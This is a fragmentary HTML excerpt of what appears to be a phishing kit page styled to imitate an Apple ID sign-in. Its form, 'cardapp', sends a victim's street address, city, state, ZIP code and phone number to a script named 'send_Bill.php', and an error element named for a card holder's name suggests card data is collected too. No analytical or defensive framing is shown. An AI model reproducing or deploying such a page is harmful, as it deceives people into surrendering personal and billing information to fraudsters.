...
">
            		...
            		<form class="column large-5 small-12 as-signin-returningcustomer" id="cardapp" name="cardapp" action="./system/send_Bill.php" method="post" >
...
<input style="border-radius: 12px;" required="" value="" type="text" id="addres" name="addres" class="form-textbox form-textbox-text" maxlength="120" ><span class="form-label">
...
<div class="dddd form-element ">
<input style="border-radius: 12px;" required="" value="" type="text" id="City" name="City" class="form-textbox form-textbox-text" maxlength="120" ><span class="form-label">
...
<div class="dddd form-element ">
<input style="border-radius: 12px;" required="" value="" type="text" id="State" name="State" class="form-textbox form-textbox-text" maxlength="120" ><span class="form-label">
<span id="loginHome.customerLogin.appleId-label">State</span></span>
<div><div id="loginHome.customerLogin.appleId-error" class="form-message-wrapper">
<span id="NameOnCardinputError" class="is-error" style="display: none;"></span>
</div><div id="loginHome.customerLogin.appleId-warn" class="form-message-warning"></div></div></div>
...
<br><br>
<div class="dddd form-element ">
<input style="border-radius: 12px;" required="" value="" type="text" id="ZipCode" name="ZipCode" class="form-textbox form-textbox-text" maxlength="120"><span class="form-label">
...
<div class="dddd form-element ">
<input style="border-radius: 12px;" required="" value="" type="text" id="phoneNumber" name="phoneNumber" class="form-textbox form-textbox-text" maxlength="120" ><span class="form-label">
